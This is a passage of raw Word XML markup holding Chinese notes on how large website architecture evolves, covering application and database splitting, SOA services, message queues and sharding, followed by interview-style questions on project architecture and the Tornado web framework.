          <w:color w:val="2E2E2E"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>。各个应用之间可以通过建立一个超链接建立关系，也可以通过消息队列进行数据分发。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7362B022" w14:textId="0A8031D2"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2AAC25F5" wp14:editId="3405722D">
            <wp:extent cx="8360962" cy="5198534"/>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74631" cy="5207033"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C0BEF28"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应用垂直拆分（分压，解耦）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5772BD5A"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降低耦合、分压；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E2CFB68"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应用架构复杂；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60E28D19" w14:textId="67D70022"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业务抽取拆分；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E4BE16E"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业务垂直分库</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="701421A2"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应用都拆了，由于单个数据库的连接，QPS，TPS，I/O处理能力都非常有限，DB层面也可以去做垂直分库操作。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F5B3A9D" w14:textId="47462DB5"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2938E00D" wp14:editId="2594323B">
            <wp:extent cx="7976447" cy="5345430"/>
            <wp:effectExtent l="0" t="0" r="571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77789" cy="5346329"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="79E46F20"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业务垂直分库 分压 解耦</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7950C2E5"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降低DB耦合、分压DB；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E5F3A2A"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数据访问模块复杂；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B881383" w14:textId="2A51C780"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业务抽取拆分；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E617037"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分布式服务化</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B1ACFD6"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拆分应用和DB之后，其实还是会有很多问题。</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="2E2E2E"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>不同的站点，里面可能会有相同逻辑和功能的代码。</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="2E2E2E"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>当然，对于一些基础的功能我们可以封装DLL或者Jar包去到处提供引用，但是这种强依赖也很容易造成一些问题（版本问题、依赖关系等处理起来非常麻烦）。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EA42720"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既然每一个应用系统都需要执行许多相通的业务操作，比如用户管理、商品管理等，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="2E2E2E"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>那么可以将这些共用的业务提取出来，独立部署</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="2E2E2E"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>。这样，传说中的SOA的价值就得到体现了。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A7DBD0F" w14:textId="3ADD3901"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05F82778" wp14:editId="6FD6ACDB">
            <wp:extent cx="8577580" cy="543941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79179" cy="5440424"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="54CAB866"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分布式服务化（解耦，去重复）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33B23BEC"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服务统一管理，提供重用度；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51F4ADBE"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应用架构更复杂；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0010F3A1" w14:textId="57B1902B"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业务抽取拆分、服务化技术方案；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="255F2169"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lastRenderedPageBreak/>
        <w:t>消息队列</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D917C48"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应用、服务之间还是会出现一些依赖问题，这时候，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="2E2E2E"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>高吞吐量的解耦利器出现了</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="2E2E2E"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6159B40A" w14:textId="3F9298C5" w:rsidR="007707E5" w:rsidRDefault="007707E5" w:rsidP="007707E5">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drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1C0EEAC8" wp14:editId="6EDF9D73">
            <wp:extent cx="7507354" cy="621453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13227" cy="6219395"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="495CD453" w14:textId="77777777" w:rsidR="007707E5" w:rsidRDefault="007707E5" w:rsidP="001423ED">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:wordWrap w:val="0"/>
        <w:spacing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lastRenderedPageBreak/>
        <w:t>消息队列（服务间异步解耦 高吞吐量）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BCFA7D8"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优点：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="777777"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>提高吞吐量、应用、服务之间解耦；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EA0FA11" w14:textId="77777777" w:rsidR="00D8288D"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缺点：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="777777"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>存在消息消费延迟问题；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="094A5530" w14:textId="5866E661"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777777"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="777777"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>技术点：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="777777"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>消息队列技术方案；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03B2CE89" w14:textId="77777777" w:rsidR="007707E5" w:rsidRDefault="007707E5" w:rsidP="001423ED">
      <w:pPr>
        <w:pStyle w:val="2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:wordWrap w:val="0"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="400" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑"/>
          <w:color w:val="2E2E2E"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="2E2E2E"/>
        </w:rPr>
        <w:t>分库分表</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DAA04CE"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*后，再介绍一个大型互联网公司都用的绝技–</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="2E2E2E"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>分库分表</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="2E2E2E"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>。个人经验，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="2E2E2E"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>不是业务发展和各方面非常迫切，不要轻易走这一步</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="2E2E2E"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E874506"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因为分库分表谁都会干，关键是拆完之后怎么办</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="2E2E2E"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>。目前，市面上还没有完全开源免费的方案，能让你一劳永逸地解决数据库拆分问题。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="266FF07E"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分库分表：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F69C83F" w14:textId="77777777" w:rsidR="007707E5" w:rsidRDefault="007707E5" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="115"/>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横向拆分；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0833F4C1" w14:textId="77777777" w:rsidR="007707E5" w:rsidRDefault="007707E5" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="115"/>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纵向拆分；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C4137C0" w14:textId="77777777" w:rsidR="007707E5" w:rsidRDefault="007707E5" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="115"/>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分布式数据库访问层；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D049DF5" w14:textId="77777777" w:rsidR="007707E5" w:rsidRDefault="007707E5" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="115"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:wordWrap w:val="0"/>
        <w:spacing w:line="340" w:lineRule="exact"/>
        <w:ind w:left="450"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑"/>
          <w:color w:val="5E5E5E"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="5E5E5E"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>数据库中间件（代理）；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="352CBEB5" w14:textId="77777777" w:rsidR="007707E5" w:rsidRDefault="007707E5" w:rsidP="001423ED">
      <w:pPr>
        <w:pStyle w:val="1"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:wordWrap w:val="0"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="400" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑"/>
          <w:color w:val="2E2E2E"/>
          <w:sz w:val="39"/>
          <w:szCs w:val="39"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="2E2E2E"/>
          <w:sz w:val="39"/>
          <w:szCs w:val="39"/>
        </w:rPr>
        <w:t>网站架构总结</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="109D0597"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Fonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="2E2E2E"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>上面讲述了在网站业务发展的不同阶段，会面临不同的问题，针对不同的问题，会选择不同的架构。</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="2E2E2E"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>大型网站架构就是在不同阶段时解决不同问题的过程中慢慢演进来的。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72EC318B"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*后几句话，送给有缘的你：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A358A78" w14:textId="77777777" w:rsidR="007707E5" w:rsidRDefault="007707E5" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="116"/>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一切以解决业务目标为首要任务；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="230E09DE" w14:textId="77777777" w:rsidR="007707E5" w:rsidRDefault="007707E5" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="116"/>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没有以业务为目标的任何架构、技术，都是毫无意义的耍流氓；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C9D4F2E" w14:textId="77777777" w:rsidR="007707E5" w:rsidRDefault="007707E5" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="116"/>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再牛逼的架构、再牛逼的技术，不能够解决业务的问题，你也只能算是会架构、会技术的工匠，而不能算是真正意义上的架构师；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69F38721" w14:textId="77777777" w:rsidR="007707E5" w:rsidRDefault="007707E5" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="116"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:wordWrap w:val="0"/>
        <w:spacing w:line="340" w:lineRule="exact"/>
        <w:ind w:left="450"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑"/>
          <w:color w:val="5E5E5E"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="5E5E5E"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>业务成就了技术，平台成就了人，事业成就了人，而不是相反；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E93DAB9" w14:textId="77777777" w:rsidR="007707E5" w:rsidRDefault="007707E5" w:rsidP="001423ED">
      <w:pPr>
        <w:pStyle w:val="a7"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:wordWrap w:val="0"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="340" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑"/>
          <w:color w:val="2E2E2E"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="2E2E2E"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>本文思维导图，如下：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60B80264" w14:textId="53529FDD" w:rsidR="007707E5" w:rsidRPr="0049386C" w:rsidRDefault="007707E5" w:rsidP="0049386C">
      <w:pPr>
        <w:pStyle w:val="a7"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="300" w:afterAutospacing="0" w:line="360" w:lineRule="atLeast"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑"/>
          <w:color w:val="2E2E2E"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑"/>
          <w:noProof/>
          <w:color w:val="2E2E2E"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0351B960" wp14:editId="2F9F287E">
            <wp:extent cx="8118349" cy="675640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70920" cy="6800152"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BD1C8C1" w14:textId="0A4D6308" w:rsidR="006B2B80" w:rsidRPr="003A0200" w:rsidRDefault="006B2B80"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lastRenderedPageBreak/>
        <w:t>0</w:t>
      </w:r>
      <w:r w:rsidR="00673A92" w:rsidRPr="003A0200">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>02</w:t>
      </w:r>
      <w:r w:rsidR="00BC6A81">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介绍你项目的架构设计</w:t>
      </w:r>
      <w:r w:rsidRPr="003A0200">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6937DBFB" w14:textId="6393A21E" w:rsidR="00673A92" w:rsidRPr="00673A92" w:rsidRDefault="00673A92" w:rsidP="00673A92">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:spacing w:before="150" w:after="150" w:line="300" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="36"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00673A92">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>看</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>实际例子</w:t>
      </w:r>
      <w:r w:rsidRPr="00673A92">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>项目架构</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A0F4D23" w14:textId="63AEEDD8" w:rsidR="006B2B80" w:rsidRPr="003A0200" w:rsidRDefault="006B2B80"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w:t>
      </w:r>
      <w:r w:rsidR="00673A92" w:rsidRPr="003A0200">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>03</w:t>
      </w:r>
      <w:r w:rsidR="00673A92" w:rsidRPr="003A0200">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Tornado</w:t>
      </w:r>
      <w:r w:rsidRPr="003A0200">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>是什么</w:t>
      </w:r>
      <w:r w:rsidRPr="003A0200">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="080EF3F6" w14:textId="77777777"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是使用</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编写的</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服务器兼</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应用框架，与主流</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服务器框架不同的是，</w:t>
      </w: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是异步非阻塞式服务器，得益于非阻塞式和对</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>epoll</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>模型的运用，</w:t>
      </w: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是实时</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服务的一个理想框架，它非常适合开发长轮询、</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和需要与每个用户建立持久连接的应用。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40B1D957" w14:textId="77777777" w:rsidR="006B2B80" w:rsidRPr="00673A92" w:rsidRDefault="006B2B80"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673A92">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>特点</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01EBC88F" w14:textId="4125D61E"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1</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轻量级</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="00673A92">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Web</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="00673A92">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>框架</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D79C348" w14:textId="63940BB9"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2</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异步非阻塞</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="00673A92">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>IO</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="00673A92">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>处理方式</w:t>
      </w:r>
      <w:r>
